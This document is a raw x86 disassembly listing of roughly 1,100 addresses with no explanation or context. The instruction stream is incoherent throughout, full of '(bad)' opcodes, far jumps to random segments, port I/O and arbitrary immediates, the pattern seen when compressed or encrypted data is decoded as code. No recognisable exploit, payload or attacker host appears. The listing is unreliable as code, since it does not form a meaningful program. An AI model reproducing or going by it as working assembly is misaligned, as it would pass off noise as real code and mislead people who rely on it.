  4c2da0:	call   0xf41b6a89
  4c2da5:	cmp    al,0xe0
  4c2da7:	(bad)  
  4c2da9:	aam    0xd0
  4c2dab:	repz cmp al,0xcf
  4c2dae:	repz int3 
  4c2db0:	enter  0xc0c4,0xbc
  4c2db4:	iret   
  4c2db5:	repz cmp al,0xcf
  4c2db8:	mov    al,0xa4
  4c2dba:	pushf  
  4c2dbb:	nop
  4c2dbc:	js     0x4c2e2a
  4c2dbe:	ja     0x4c2d9d
  4c2dc0:	repz cmp al,0x58
  4c2dc3:	cmp    BYTE PTR [eax],bl
  4c2dc5:	mov    DWORD PTR [edi-0x72],0x79e79e06
  4c2dcc:	sahf   
  4c2dcd:	mov    eax,0x34547894
  4c2dd2:	or     al,0xe7
  4c2dd4:	jns    0x4c2db4
  4c2dd6:	jge    0x4c2dc8
  4c2dd8:	inc    esi
  4c2dd9:	fiadd  WORD PTR [esi]
  4c2ddb:	(bad)  
  4c2ddd:	les    ebx,FWORD PTR [esi-0x5f618619]
  4c2de3:	cwde   
  4c2de4:	mov    WORD PTR [eax+eiz*2+0x40],?
  4c2de8:	cmp    al,0x4f
  4c2dea:	repz jns 0x4c2e05
  4c2ded:	lock inc ebp
  4c2def:	enter  0x809c,0xf0
  4c2df3:	ds iret 
  4c2df5:	repz pop esp
  4c2df7:	cmp    BYTE PTR [eax+eiz*8],cl
  4c2dfa:	inc    esp
  4c2dfb:	jle    0x4c2e41
  4c2dfd:	repz cmp al,0xef
  4c2e00:	int    0x7f
  4c2e02:	mov    al,0xe
  4c2e04:	xchg   esp,eax
  4c2e05:	push   es
  4c2e06:	and    BYTE PTR [eax+0x44],0xd4
  4c2e0a:	push   eax
  4c2e0b:	ja     0x4c2db5
  4c2e0d:	adc    cl,BYTE PTR [esi+0x6]
  4c2e10:	push   esi
  4c2e11:	lea    edi,[ebx+edi*8+0x2331369f]
  4c2e18:	push   ecx
  4c2e19:	dec    esi
  4c2e1a:	inc    ecx
  4c2e1b:	dec    esi
  4c2e1c:	cmovns ecx,DWORD PTR [esi+0x46]
  4c2e20:	add    BYTE PTR [ecx+ebx*4-0x2b],al
  4c2e24:	out    dx,al
  4c2e25:	repnz das 
  4c2e27:	push   ebx
  4c2e28:	push   ebx
  4c2e29:	dec    esi
  4c2e2a:	pop    edx
  4c2e2b:	push   eax
  4c2e2c:	pop    ss
  4c2e2d:	sub    DWORD PTR [ecx],0x973e5094
  4c2e33:	push   ebx
  4c2e34:	test   BYTE PTR [ecx+0x494f1d70],al
  4c2e3a:	cmp    bh,BYTE PTR [edx-0x1f]
  4c2e3d:	mov    ch,0x43
  4c2e3f:	or     eax,0x4116e702
  4c2e44:	outs   dx,DWORD PTR ds:[esi]
  4c2e45:	lock mov ebp,0x3a1b7c2f
  4c2e4b:	push   edx
  4c2e4c:	push   dx
  4c2e4e:	aaa    
  4c2e4f:	dec    eax
  4c2e50:	fnstsw WORD PTR [ebx+0x502b87a0]
  4c2e56:	andps  xmm3,XMMWORD PTR [edx]
  4c2e59:	pop    eax
  4c2e5a:	or     dh,BYTE PTR [esi+0x70]
  4c2e5d:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c2e5f:	das    
  4c2e60:	inc    esi
  4c2e61:	mov    cs,WORD PTR [ebx+edx*2+0x4f]
  4c2e65:	outs   dx,BYTE PTR ds:[esi]
  4c2e66:	loope  0x4c2e85
  4c2e68:	in     al,dx
  4c2e69:	mov    dh,0x43
  4c2e6b:	pop    ds
  4c2e6c:	jmp    0x7623:0xa8749e7
  4c2e73:	sub    esi,DWORD PTR [esi-0xa]
  4c2e76:	cmp    edi,DWORD PTR [edx-0x71e2917d]
  4c2e7c:	push   ebp
  4c2e7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c2e7e:	inc    edx
  4c2e7f:	adc    eax,DWORD PTR [ecx]
  4c2e81:	inc    ebx
  4c2e82:	or     BYTE PTR [edi],al
  4c2e84:	loope  0x4c2e81
  4c2e86:	ret    
  4c2e87:	inc    ecx
  4c2e88:	sbb    edx,DWORD PTR [edx+0x77]
  4c2e8b:	mov    ds:0x866f0761,eax
  4c2e90:	dec    edi
  4c2e91:	arpl   WORD PTR [ecx],ax
  4c2e93:	push   esp
  4c2e94:	rol    BYTE PTR [ebp+ebx*2+0x420bd70],cl
  4c2e9b:	popa   
  4c2e9c:	call   0x15b89859
  4c2ea1:	add    al,0x68
  4c2ea3:	pop    edx
  4c2ea4:	adc    al,BYTE PTR [ecx+0x75]
  4c2ea7:	fimul  WORD PTR [ecx+0x20]
  4c2eaa:	repz add eax,0x2eed0291
  4c2eb0:	sbb    al,0x56
  4c2eb2:	scas   al,BYTE PTR es:[edi]
  4c2eb3:	les    ebx,FWORD PTR [esi+0x42]
  4c2eb6:	cwde   
  4c2eb7:	jmp    0x55e1:0x5014aa
  4c2ebe:	or     edx,eax
  4c2ec0:	in     al,dx
  4c2ec1:	gs ins DWORD PTR es:[edi],dx
  4c2ec3:	popa   
  4c2ec4:	pop    eax
  4c2ec5:	push   0x76
  4c2ec7:	dec    esi
  4c2ec8:	jo     0x4c2f3a
  4c2eca:	cmp    dh,BYTE PTR [edx+eax*8+0x6d]
  4c2ece:	add    bl,ah
  4c2ed0:	inc    eax
  4c2ed1:	popa   
  4c2ed2:	push   0x499467ee
  4c2ed7:	xchg   DWORD PTR [eax+0x73],esi
  4c2eda:	mov    bh,0x39
  4c2edc:	cs and bh,BYTE PTR ds:[eax+0x14]
  4c2ee1:	mov    WORD PTR [eax+0x788bfbb],es
  4c2ee7:	ret    0x860b
  4c2eea:	imul   esi,DWORD PTR [esi-0x36],0x11
  4c2eee:	xor    dl,al
  4c2ef0:	mov    dh,0x9e
  4c2ef2:	retf   
  4c2ef3:	repz pop esi
  4c2ef5:	pop    esp
  4c2ef6:	ficom  WORD PTR [eax+0x2]
  4c2ef9:	ds inc ecx
  4c2efb:	xchg   DWORD PTR [edi+0x4a],ecx
  4c2efe:	push   esp
  4c2eff:	pop    ds
  4c2f00:	push   ds
  4c2f01:	add    BYTE PTR [ebx+0xf4d2ea7],cl
  4c2f07:	pop    eax
  4c2f08:	ins    BYTE PTR es:[edi],dx
  4c2f09:	neg    edx
  4c2f0b:	jnp    0x4c2f13
  4c2f0d:	inc    ebx
  4c2f0e:	aas    
  4c2f0f:	push   cs
  4c2f10:	cmp    al,0x3
  4c2f12:	add    BYTE PTR [ebx],bh
  4c2f14:	xlat   BYTE PTR ds:[ebx]
  4c2f15:	push   0xf
  4c2f17:	push   esi
  4c2f18:	push   ebx
  4c2f19:	repz push edi
  4c2f1b:	das    
  4c2f1c:	test   BYTE PTR [ebx+0x60],0xa
  4c2f20:	or     bl,0x53
  4c2f23:	mov    esi,0x7b7041db
  4c2f28:	mov    dh,0x75
  4c2f2a:	imul   DWORD PTR [edi]
  4c2f2c:	cmp    esi,DWORD PTR [ebx]
  4c2f2e:	xor    ebp,DWORD PTR [ebx-0x20]
  4c2f31:	sub    DWORD PTR [eax+esi*2+0x7b076e0b],edi
  4c2f38:	add    DWORD PTR ds:0x78a24fb5,ebp
  4c2f3e:	mul    BYTE PTR [edi]
  4c2f40:	sbb    eax,DWORD PTR [edx]
  4c2f42:	or     esp,eax
  4c2f44:	gs dec esi
  4c2f46:	and    cl,BYTE PTR [edi-0x9]
  4c2f49:	push   ds
  4c2f4a:	rcl    BYTE PTR [ecx+0x53],0xe
  4c2f4e:	push   esi
  4c2f4f:	jo     0x4c2f4c
  4c2f51:	mov    eax,0x54c3ee00
  4c2f56:	aas    
  4c2f57:	imul   eax,esi,0xffffffbe
  4c2f5a:	inc    ebx
  4c2f5b:	int3   
  4c2f5c:	pop    ebx
  4c2f5d:	out    dx,eax
  4c2f5e:	or     ecx,DWORD PTR [edi+0x1393554f]
  4c2f64:	mov    al,0x82
  4c2f66:	sbb    eax,DWORD PTR [eax]
  4c2f68:	mov    edi,esi
  4c2f6a:	call   0xabb7:0x6cc20580
  4c2f71:	cld    
  4c2f72:	push   es
  4c2f73:	push   ss
  4c2f74:	inc    eax
  4c2f75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c2f76:	out    dx,eax
  4c2f77:	jns    0x4c2fa9
  4c2f79:	or     esp,eax
  4c2f7b:	add    DWORD PTR [ebx],edi
  4c2f7d:	mov    esi,0x7dc37875
  4c2f82:	or     BYTE PTR [ebp+0xe],0x2e
  4c2f86:	fs stos BYTE PTR es:[edi],al
  4c2f88:	dec    ecx
  4c2f89:	jae    0x4c2fdf
  4c2f8b:	pop    ss
  4c2f8c:	into   
  4c2f8d:	ret    0x1c77
  4c2f90:	mul    DWORD PTR [edi]
  4c2f92:	test   dh,0x44
  4c2f95:	push   cs
  4c2f96:	push   cs
  4c2f97:	fidiv  WORD PTR [ebx-0x15]
  4c2f9a:	(bad)  
  4c2f9b:	mov    dh,0x8e
  4c2f9d:	addr16 xchg edx,eax
  4c2f9f:	push   eax
  4c2fa0:	inc    edi
  4c2fa1:	not    BYTE PTR [eax]
  4c2fa3:	out    dx,al
  4c2fa4:	ror    BYTE PTR [esi-0x5561ab9f],cl
  4c2faa:	das    
  4c2fab:	out    dx,eax
  4c2fac:	out    dx,al
  4c2fad:	inc    ebx
  4c2fae:	sbb    BYTE PTR [esi+0x2b],dh
  4c2fb1:	push   edx
  4c2fb2:	xchg   BYTE PTR [edi+0x3d],dh
  4c2fb5:	pop    ss
  4c2fb6:	mov    WORD PTR [ecx+0x737ba249],es
  4c2fbc:	push   ecx
  4c2fbd:	outs   dx,BYTE PTR ds:[esi]
  4c2fbe:	mov    ch,0x56
  4c2fc0:	sub    dl,0x83
  4c2fc3:	popa   
  4c2fc4:	arpl   WORD PTR [ecx],ax
  4c2fc6:	xor    BYTE PTR [ebx],0xde
  4c2fc9:	xor    DWORD PTR [edi+0x5f],0x73
  4c2fcd:	inc    ebx
  4c2fce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c2fcf:	mov    ah,0x4b
  4c2fd1:	loopne 0x4c2f81
  4c2fd3:	ret    0x1666
  4c2fd6:	jnp    0x4c3017
  4c2fd8:	js     0x4c2fe2
  4c2fda:	inc    edi
  4c2fdb:	xor    bl,BYTE PTR [ebx+eax*2+0x5f]
  4c2fdf:	out    dx,eax
  4c2fe0:	stos   BYTE PTR es:[edi],al
  4c2fe1:	test   DWORD PTR [eax],0x78064292
  4c2fe7:	inc    edi
  4c2fe8:	imul   esp,DWORD PTR [ebx+0x6a],0x236183aa
  4c2fef:	jl     0x4c3028
  4c2ff1:	or     ecx,DWORD PTR [esp+ebx*8+0x9]
  4c2ff5:	mov    eax,0xe5f73bb
  4c2ffa:	xchg   edx,eax
  4c2ffb:	test   BYTE PTR [esi],0x78
  4c2ffe:	xor    BYTE PTR [eax],bh
  4c3000:	(bad)  
  4c3002:	mov    ds:0xc16933ca,al
  4c3007:	mov    ebx,0x2faf18b7
  4c300c:	out    0xff,al
  4c300e:	jb     0x4c306d
  4c3010:	in     al,dx
  4c3011:	loope  0x4c2fd1
  4c3013:	and    esi,DWORD PTR [ebx-0x1e]
  4c3016:	out    0x4f,eax
  4c3018:	ins    BYTE PTR es:[edi],dx
  4c3019:	mov    ebx,0xefb1e9da
  4c301e:	out    dx,eax
  4c301f:	push   edi
  4c3020:	mov    BYTE PTR [edi-0x55],0x81
  4c3024:	js     0x4c2fd5
  4c3026:	pop    esp
  4c3027:	pop    ds
  4c3028:	push   edx
  4c3029:	repnz dec esi
  4c302b:	sbb    ebp,esp
  4c302d:	in     al,0xd7
  4c302f:	jbe    0x4c2fcc
  4c3031:	inc    ebx
  4c3032:	push   ebx
  4c3033:	pop    ss
  4c3034:	ds pusha 
  4c3036:	(bad)  
  4c3037:	cs inc eax
  4c3039:	dec    esi
  4c303a:	pop    ds
  4c303b:	inc    edi
  4c303c:	fist   DWORD PTR [eax+0x4f]
  4c303f:	out    dx,eax
  4c3040:	fistp  DWORD PTR [esi-0x3d]
  4c3043:	mov    esi,0x178bbf44
  4c3048:	pop    eax
  4c3049:	push   es
  4c304a:	pop    ecx
  4c304b:	cmp    eax,0xe77af7c0
  4c3050:	(bad)  
  4c3051:	inc    edi
  4c3052:	dec    esi
  4c3053:	inc    edi
  4c3054:	inc    ecx
  4c3055:	test   DWORD PTR ds:0xbf0ed760,edx
  4c305b:	sbb    esp,DWORD PTR [eax]
  4c305d:	shl    BYTE PTR [ebp+0x6730677],0x75
  4c3064:	pop    ss
  4c3065:	fs mov bh,0x57
  4c3068:	pop    ebx
  4c3069:	jae    0x4c302d
  4c306b:	out    0x1b,eax
  4c306d:	push   cs
  4c306e:	inc    ebx
  4c306f:	out    0xc3,eax
  4c3071:	mov    ebx,0x9756edd8
  4c3076:	pop    ebx
  4c3077:	and    ecx,DWORD PTR [eax-0x2d]
  4c307a:	scas   al,BYTE PTR es:[edi]
  4c307b:	lock push es
  4c307d:	mov    dh,0xbc
  4c307f:	ds cmp eax,0xec673a23
  4c3085:	pop    ebx
  4c3086:	fist   DWORD PTR [esi-0x61]
  4c3089:	inc    edi
  4c308a:	and    edx,DWORD PTR [edi+0x176d5b54]
  4c3090:	lods   al,BYTE PTR ds:[esi]
  4c3091:	popa   
  4c3092:	pop    ss
  4c3093:	retf   
  4c3094:	cmp    eax,0xd17070ef
  4c3099:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c309a:	xor    ecx,DWORD PTR [edi+0x41]
  4c309d:	xchg   ebx,eax
  4c309e:	pop    ds
  4c309f:	ins    DWORD PTR es:[edi],dx
  4c30a0:	mov    esp,eax
  4c30a2:	or     BYTE PTR [edi+0x31f71f5d],dh
  4c30a8:	jo     0x4c305b
  4c30aa:	stos   DWORD PTR es:[edi],eax
  4c30ab:	rol    DWORD PTR [eax],cl
  4c30ad:	pop    ss
  4c30ae:	push   0x14c7d383
  4c30b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c30b4:	(bad)  
  4c30b6:	inc    ebx
  4c30b7:	pop    ds
  4c30b8:	adc    dl,BYTE PTR [esi]
  4c30ba:	xlat   BYTE PTR ds:[ebx]
  4c30bb:	ss mov edi,0x93491b87
  4c30c1:	bound  esp,QWORD PTR [esi]
  4c30c3:	test   DWORD PTR [esi],eax
  4c30c5:	add    edi,DWORD PTR [edx+0x1616a8b6]
  4c30cb:	mov    ebx,0x221255c2
  4c30d0:	out    dx,al
  4c30d1:	js     0x4c30b7
  4c30d3:	out    0x26,eax
  4c30d5:	arpl   WORD PTR [esi+0x69],bp
  4c30d8:	lahf   
  4c30d9:	out    0x26,eax
  4c30db:	mov    bh,0x55
  4c30dd:	outs   dx,DWORD PTR ds:[esi]
  4c30de:	push   es
  4c30df:	xor    ebx,ebx
  4c30e1:	popa   
  4c30e2:	push   ss
  4c30e3:	and    eax,ecx
  4c30e5:	jbe    0x4c30dd
  4c30e7:	in     al,0x4
  4c30e9:	loopne 0x4c314c
  4c30eb:	ja     0x608b474e
  4c30f1:	dec    ebp
  4c30f2:	in     al,dx
  4c30f3:	repz fidiv WORD PTR [edi]
  4c30f6:	push   cs
  4c30f7:	das    
  4c30f8:	push   es
  4c30f9:	daa    
  4c30fa:	cdq    
  4c30fb:	pop    edi
  4c30fc:	aaa    
  4c30fd:	test   ebx,edx
  4c30ff:	ds mov bh,0xe7
  4c3102:	push   ds
  4c3103:	pop    ebp
  4c3104:	pop    eax
  4c3105:	rdpmc  
  4c3107:	in     al,dx
  4c3108:	pop    esi
  4c3109:	push   ss
  4c310a:	bound  edi,QWORD PTR ds:0xb0def3cf
  4c3110:	push   cs
  4c3111:	test   al,0x6
  4c3113:	mov    al,ds:0x9e0a949a
  4c3118:	imul   DWORD PTR ds:0x61b077af
  4c311e:	pop    ss
  4c311f:	popf   
  4c3120:	push   es
  4c3121:	ja     0x4c312b
  4c3123:	std    
  4c3124:	fisub  WORD PTR [edi+0x46628e7d]
  4c312a:	cmc    
  4c312b:	mov    ah,BYTE PTR [ecx+0x57]
  4c312e:	pop    es
  4c312f:	inc    ebp
  4c3130:	pusha  
  4c3131:	mov    ebp,0x7789c113
  4c3136:	mov    ds:0x5d6a0f5d,al
  4c313b:	out    0x86,eax
  4c313d:	out    0x9b,al
  4c313f:	fcomp  DWORD PTR [esi-0x176974b1]
  4c3145:	pop    esp
  4c3146:	mov    BYTE PTR [edi-0x62],bl
  4c3149:	out    dx,eax
  4c314a:	lods   eax,DWORD PTR ds:[esi]
  4c314b:	fld    QWORD PTR [esi]
  4c314d:	outs   dx,DWORD PTR ds:[esi]
  4c314e:	pop    es
  4c314f:	addr16 xor eax,0x3c03ff2d
  4c3155:	xlat   BYTE PTR ds:[ebx]
  4c3156:	xchg   DWORD PTR ds:0x656b5020,esp
  4c315c:	jb     0x4c31cc
  4c315e:	gs ins BYTE PTR es:[edi],dx
  4c3160:	xor    esi,DWORD PTR [edx]
  4c3162:	test   eax,0x9f2d1bf4
  4c3167:	jae    0x4c31c0
  4c3169:	outs   dx,DWORD PTR ds:[esi]
  4c316a:	ja     0x4c31a2
  4c316c:	xor    al,0xdf
  4c316e:	cmp    eax,0xffffffd9
  4c3171:	dec    edx
  4c3172:	addr16 dec esi
  4c3174:	popa   
  4c3175:	push   ebx
  4c3176:	jns    0x4c31eb
  4c3178:	mov    ds:0xc892b0b1,eax
  4c317d:	retf   0x921e
  4c3180:	jo     0x4c316d
  4c3182:	adc    al,0x96
  4c3184:	imul   edi,DWORD PTR [ebx-0x1d2485ff],0xe6aea8b
  4c318e:	pop    ds
  4c318f:	dec    ebx
  4c3190:	aaa    
  4c3191:	rol    BYTE PTR [ebp-0x4c],cl
  4c3194:	push   ebx
  4c3195:	jo     0x4c320d
  4c3197:	je     0x4c3210
  4c3199:	sbb    eax,DWORD PTR [eax-0x2c7e7157]
  4c319f:	out    0x77,eax
  4c31a1:	pop    ss
  4c31a2:	or     edi,DWORD PTR [eax]
  4c31a4:	loope  0x4c321d
  4c31a6:	xchg   edx,eax
  4c31a7:	inc    edx
  4c31a8:	xchg   edx,eax
  4c31aa:	pusha  
  4c31ab:	das    
  4c31ac:	pop    esi
  4c31ad:	out    0xb3,al
  4c31af:	addr16 daa 
  4c31b1:	or     ebp,DWORD PTR [ecx+0x69]
  4c31b4:	pop    es
  4c31b5:	jae    0x4c31da
  4c31b7:	xchg   esi,eax
  4c31b8:	ins    BYTE PTR es:[edi],dx
  4c31b9:	push   edi
  4c31ba:	sbb    ebx,DWORD PTR [eax+0xef6c85]
  4c31c0:	mov    eax,DWORD PTR [eax]
  4c31c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c31c3:	xor    eax,0x4f682470
  4c31c8:	arpl   WORD PTR fs:[edi],cx
  4c31cb:	mov    eax,0x6c611634
  4c31d0:	addr16 inc edi
  4c31d2:	dec    ebx
  4c31d3:	jnp    0x4c3195
  4c31d5:	and    BYTE PTR [edx-0x2d],0x8f
  4c31d9:	pop    ss
  4c31da:	adc    ebp,DWORD PTR ds:0x680d8b84
  4c31e0:	out    dx,eax
  4c31e1:	fs (bad) 
  4c31e3:	bound  eax,QWORD PTR [edx-0x709cf7af]
  4c31e9:	adc    ecx,DWORD PTR [edi-0x6109f9f2]
  4c31ef:	add    BYTE PTR ss:[edi+esi*1],dh
  4c31f3:	sbb    esi,DWORD PTR [esi-0x65]
  4c31f6:	or     dh,BYTE PTR [esi]
  4c31f8:	aaa    
  4c31f9:	adc    al,0xf2
  4c31fb:	daa    
  4c31fc:	aaa    
  4c31fd:	(bad)  
  4c31fe:	or     eax,0xed6f6b
  4c3203:	jg     0x4c321c
  4c3205:	xor    ecx,DWORD PTR [edi+0x36b741bb]
  4c320b:	add    BYTE PTR [ebx],dl
  4c320d:	inc    edi
  4c320e:	jae    0x4c324e
  4c3210:	push   ds
  4c3211:	mov    ebx,DWORD PTR [bp+di+0x60]
  4c3215:	ins    DWORD PTR es:[edi],dx
  4c3216:	sbb    ebx,DWORD PTR [edx-0x28fb0bfe]
  4c321c:	mov    ebp,0xfb65176b
  4c3221:	pop    ds
  4c3222:	jns    0x4c326a
  4c3224:	jg     0x4c3245
  4c3226:	or     ecx,esp
  4c3228:	fisubr WORD PTR [esi-0x35]
  4c322b:	pop    ss
  4c322c:	arpl   WORD PTR [edx+0xb],cx
  4c322f:	or     DWORD PTR [ebp+0x135e1e0e],ebx
  4c3235:	out    dx,eax
  4c3236:	inc    si
  4c3238:	sbb    BYTE PTR ds:0xdf445713,dl
  4c323e:	les    edx,FWORD PTR cs:[ebx]
  4c3241:	push   esi
  4c3242:	jmp    0x4c3287
  4c3244:	jns    0x4c32a1
  4c3246:	(bad)  
  4c3248:	into   
  4c3249:	add    eax,edi
  4c324b:	out    dx,al
  4c324c:	push   edx
  4c324d:	inc    edi
  4c324e:	add    BYTE PTR [ebx],dl
  4c3250:	ins    BYTE PTR es:[edi],dx
  4c3251:	pop    ecx
  4c3252:	je     0x4c31e1
  4c3254:	inc    ebp
  4c3255:	stos   DWORD PTR es:[edi],eax
  4c3256:	ficom  WORD PTR [esi-0x12]
  4c3259:	add    edx,DWORD PTR [edi-0x46]
  4c325c:	into   
  4c325d:	jnp    0x4c324c
  4c325f:	push   esi
  4c3260:	mov    dh,0xb0
  4c3262:	push   ss
  4c3263:	add    BYTE PTR [esi],0x48
  4c3266:	cs inc edi
  4c3268:	test   BYTE PTR [edi+0x22556aa5],0x3e
  4c326f:	ins    BYTE PTR es:[edi],dx
  4c3270:	jne    0x4c32d9
  4c3272:	imul   ebp,DWORD PTR [esi+0x44],0x97dc2210
  4c3279:	adc    DWORD PTR [edx-0x77],esp
  4c327c:	das    
  4c327d:	test   BYTE PTR [ebx-0x10],ch
  4c3280:	inc    BYTE PTR [eax+0x56]
  4c3283:	popa   
  4c3284:	jb     0x4c3271
  4c3286:	pop    ebx
  4c3287:	jne    0x4c3253
  4c3289:	cmp    al,0xef
  4c328b:	xchg   eax,esi
  4c328d:	ja     0x4c32aa
  4c328f:	ja     0x4c3253
  4c3291:	jb     0x4c32ef
  4c3293:	mov    eax,0x5346a589
  4c3298:	daa    
  4c3299:	add    BYTE PTR [esi],bl
  4c329b:	push   ss
  4c329c:	js     0x4c32a0
  4c329e:	pop    ss
  4c329f:	jg     0x4c32a7
  4c32a1:	xchg   dh,bl
  4c32a3:	test   eax,esi
  4c32a5:	adc    cl,BYTE PTR [edx+0x3e023d4a]
  4c32ab:	and    ebx,ebx
  4c32ad:	mov    esi,0x2e370eee
  4c32b2:	and    ecx,DWORD PTR [edx]
  4c32b4:	dec    edi
  4c32b5:	psraw  mm7,QWORD PTR [ebx+0x4b6a0f10]
  4c32bc:	and    BYTE PTR [ebx+0x3a],dh
  4c32bf:	dec    edi
  4c32c0:	pusha  
  4c32c1:	mov    ah,0xf
  4c32c3:	xchg   edi,eax
  4c32c4:	das    
  4c32c5:	mov    edi,0xc2bbcbbb
  4c32ca:	inc    esi
  4c32cb:	addr16 jle 0x4c32f0
  4c32ce:	and    dl,dl
  4c32d0:	arpl   WORD PTR [ecx],sp
  4c32d2:	mov    WORD PTR [eax],ss
  4c32d4:	outs   dx,DWORD PTR ds:[esi]
  4c32d5:	or     edx,DWORD PTR [edi]
  4c32d7:	sbb    DWORD PTR [edi],ebx
  4c32d9:	sbb    bh,bl
  4c32db:	inc    edi
  4c32dc:	cs aaa 
  4c32de:	push   ds
  4c32df:	and    BYTE PTR [edx+0x5],dl
  4c32e2:	stos   DWORD PTR es:[edi],eax
  4c32e3:	lods   eax,DWORD PTR ds:[esi]
  4c32e4:	dec    ebx
  4c32e5:	pop    ebx
  4c32e6:	xchg   ecx,esp
  4c32e8:	dec    esp
  4c32e9:	nop
  4c32ea:	or     al,BYTE PTR [ebx+0x17112357]
  4c32f0:	or     DWORD PTR [ecx+0x1320a78b],ecx
  4c32f6:	inc    ebx
  4c32f7:	fisubr DWORD PTR [ebp-0x54fe8145]
  4c32fd:	jae    0x4c3337
  4c32ff:	sbb    BYTE PTR [edx],cl
  4c3301:	imul   ecx,DWORD PTR [ebx+0x32],0xffffffcf
  4c3305:	mov    WORD PTR [edi],gs
  4c3307:	or     al,0x2e
  4c3309:	sbb    ebp,DWORD PTR [edx]
  4c330b:	mov    cs,esi
  4c330d:	xor    edi,DWORD PTR ds:0x2b1cf784
  4c3313:	sbb    edx,DWORD PTR [esi]
  4c3315:	js     0x4c32b5
  4c3317:	jnp    0x4c32fa
  4c3319:	(bad)  
  4c331a:	scas   al,BYTE PTR es:[edi]
  4c331b:	aaa    
  4c331c:	cmp    esi,DWORD PTR [ebx]
  4c331e:	mov    edx,0x739e932a
  4c3323:	fild   DWORD PTR [ecx]
  4c3325:	sub    ch,BYTE PTR [edi+0x13]
  4c3328:	add    DWORD PTR [ebx-0x3f],edi
  4c332b:	mov    bl,0xb0
  4c332d:	or     al,BYTE PTR [edi+0x16391f83]
  4c3333:	mov    es,WORD PTR [edx-0x3b9c5126]
  4c3339:	inc    ebp
  4c333a:	test   DWORD PTR [edx+ecx*1+0x41232e07],0x2a4f7ab4
  4c3345:	imul   edx,DWORD PTR [edi-0x49],0x72
  4c3349:	push   ecx
  4c334a:	fdiv   st,st(1)
  4c334c:	shl    bl,cl
  4c334e:	pop    ss
  4c334f:	sbb    edi,0xffffffc4
  4c3352:	sub    esp,edx
  4c3354:	ja     0x4c333d
  4c3356:	arpl   di,bx
  4c3358:	(bad)  
  4c3359:	lds    edx,FWORD PTR [esi+0x11]
  4c335c:	or     esp,edi
  4c335e:	jae    0x4c32e9
  4c3360:	aad    0x42
  4c3362:	loop   0x4c3303
  4c3364:	mov    ebx,0xdbc15842
  4c3369:	xchg   ebx,eax
  4c336a:	mov    bh,0xab
  4c336c:	mov    esi,ecx
  4c336e:	xchg   cl,ch
  4c3370:	imul   DWORD PTR [ebx+0x6d]
  4c3373:	dec    edi
  4c3374:	push   edi
  4c3375:	or     eax,0x20aede0e
  4c337a:	sti    
  4c337b:	ja     0x4c333c
  4c337d:	or     dh,BYTE PTR [edi+0x23e30311]
  4c3383:	dec    edx
  4c3384:	pop    edi
  4c3385:	cs fwait
  4c3387:	test   DWORD PTR [edi+0x6f712f07],ebp
  4c338d:	xor    edx,DWORD PTR ds:0x65c6
  4c3392:	xchg   ebx,eax
  4c3393:	cmp    dh,BYTE PTR ss:[edi+0x63]
  4c3397:	in     eax,dx
  4c3398:	mov    edx,0x564f4740
  4c339d:	inc    edi
  4c339e:	sub    al,0x57
  4c33a0:	mov    edi,0x83619b5a
  4c33a5:	push   edx
  4c33a6:	loop   0x4c340f
  4c33a8:	inc    esp
  4c33a9:	sbb    al,0x70
  4c33ab:	sbb    al,0x43
  4c33ad:	push   edi
  4c33ae:	sub    eax,0xd8569829
  4c33b3:	call   FWORD PTR [edi+0x61]
  4c33b6:	jl     0x4c33ca
  4c33b8:	pop    ss
  4c33b9:	fcom   st(3)
  4c33bb:	ja     0x4c3418
  4c33bd:	ret    0x3123
  4c33c0:	jne    0x4c3385
  4c33c2:	and    ebx,DWORD PTR [edi]
  4c33c4:	mov    eax,0xd7c537bd
  4c33c9:	sub    eax,0x733ff3cf
  4c33ce:	pop    eax
  4c33cf:	js     0x4c3409
  4c33d1:	push   0x36cf673f
  4c33d6:	mov    ah,0x95
  4c33d8:	(bad)  
  4c33d9:	retf   0xa303
  4c33dc:	add    bh,cl
  4c33de:	or     al,0xba
  4c33e0:	jne    0x4c33ed
  4c33e2:	adc    esp,DWORD PTR [edi+esi*1+0x65]
  4c33e6:	push   edi
  4c33e7:	or     eax,0x4b12875a
  4c33ec:	cmp    eax,DWORD PTR [ebx+0x4f]
  4c33ef:	ja     0x4c33f0
  4c33f1:	jo     0x4c33e0
  4c33f3:	inc    eax
  4c33f4:	add    bh,dl
  4c33f6:	dec    edx
  4c33f7:	inc    esp
  4c33f8:	push   edx
  4c33f9:	cmp    al,BYTE PTR [edi-0x12]
  4c33fc:	push   eax
  4c33fd:	mov    ah,dh
  4c33ff:	stos   DWORD PTR es:[edi],eax
  4c3400:	push   ebp
  4c3401:	test   ebx,0xdb13254f
  4c3407:	cmc    
  4c3408:	adc    cl,BYTE PTR [esi+0xf]
  4c340b:	inc    edi
  4c340c:	dec    esp
  4c340d:	test   BYTE PTR [esi+0x3b],0x63
  4c3411:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c3412:	rol    BYTE PTR [esi+0x4b],cl
  4c3415:	pop    ds
  4c3416:	ins    DWORD PTR es:[edi],dx
  4c3417:	mov    ebx,0x474bb6c4
  4c341c:	aas    
  4c341d:	pop    ss
  4c341e:	lea    esi,[ebp-0x3a]
  4c3421:	mov    ch,0x37
  4c3423:	inc    ebx
  4c3424:	daa    
  4c3425:	dec    esp
  4c3426:	(bad)  
  4c3427:	sub    esp,eax
  4c3429:	push   cs
  4c342a:	mov    dh,0x1f
  4c342c:	(bad)  
  4c342d:	dec    ebp
  4c342e:	push   ss
  4c342f:	getsec 
  4c3431:	cmp    BYTE PTR [eax+0x427e5fc4],ch
  4c3437:	xlat   BYTE PTR ds:[ebx]
  4c3438:	fidivr DWORD PTR [edx]
  4c343a:	enter  0x5c91,0xb4
  4c343e:	xor    bh,BYTE PTR [edi]
  4c3440:	xor    DWORD PTR [ebp+0x5c],ecx
  4c3443:	and    DWORD PTR [ebx],edx
  4c3445:	sbb    esi,DWORD PTR [edi]
  4c3447:	push   edx
  4c3448:	dec    esp
  4c3449:	jnp    0x4c3411
  4c344b:	ret    
  4c344c:	test   DWORD PTR [edi+eiz*8-0x4a],ecx
  4c3450:	dec    eax
  4c3451:	cmp    dl,BYTE PTR [edi]
  4c3453:	in     al,dx
  4c3454:	cdq    
  4c3455:	lea    esi,[esi+0x312f3202]
